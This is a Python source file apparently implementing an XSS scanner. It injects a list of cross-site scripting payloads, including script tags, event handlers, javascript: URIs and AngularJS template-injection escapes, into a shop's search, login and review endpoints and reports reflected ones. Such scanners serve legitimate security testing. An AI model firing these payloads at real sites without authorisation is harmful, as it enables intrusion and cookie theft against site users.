import requests
import logging

logging.basicConfig(level=logging.DEBUG)

def xss_check(url):
    # Advanced XSS payloads for better detection
    payloads = [
        "<script>alert(document.domain)</script>",
        "<svg/onload=alert(document.domain)>",
        "' onmouseover=alert(document.cookie) '",
        "{{constructor.constructor('alert(1)')()}}",
        "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1,alert(1)')}}",
        "<img src=x onerror=alert('XSS')>",
        "<body onload=alert(document.cookie)>",
        "javascript:alert('XSS')",
        "<iframe src=javascript:alert('XSS')>",
        "<button onclick=alert('XSS')>Click me</button>",
        "<a href=# onmouseover=alert(document.cookie)>Hover me</a>"
    ]

    vulnerable = []

    # Test product search endpoint
    for payload in payloads:
        test_url = f"{url}/rest/products/search?q={payload}"
        logging.debug(f"Testing search endpoint: {test_url}")
        try:
            response = requests.get(test_url, timeout=10)
            if payload in response.text:
                vulnerable.append(f"XSS detected in search using payload: {payload}")
        except Exception as e:
            logging.error(f"Error testing search endpoint: {e}")

    # Test login field (sending XSS in email)
    login_payload = payloads[0]
    login_data = {"email": login_payload, "password": "password"}
    try:
        login_url = f"{url}/rest/user/login"
        logging.debug(f"Testing login endpoint: {login_url} with payload: {login_payload}")
        login_response = requests.post(login_url, json=login_data, timeout=10)
        if login_payload in login_response.text:
            vulnerable.append("XSS detected in login form (email field).")
    except Exception as e:
        logging.error(f"Error testing login endpoint: {e}")

    # Test product reviews submission
    review_payload = payloads[1]
    review_data = {"message": review_payload}
    try:
        review_url = f"{url}/api/reviews"
        logging.debug(f"Testing review submission endpoint: {review_url} with payload: {review_payload}")
        review_response = requests.post(review_url, json=review_data, timeout=10)
        if review_payload in review_response.text:
            vulnerable.append("XSS detected in product reviews.")
    except Exception as e:
        logging.error(f"Error testing review endpoint: {e}")

    return vulnerable if vulnerable else None
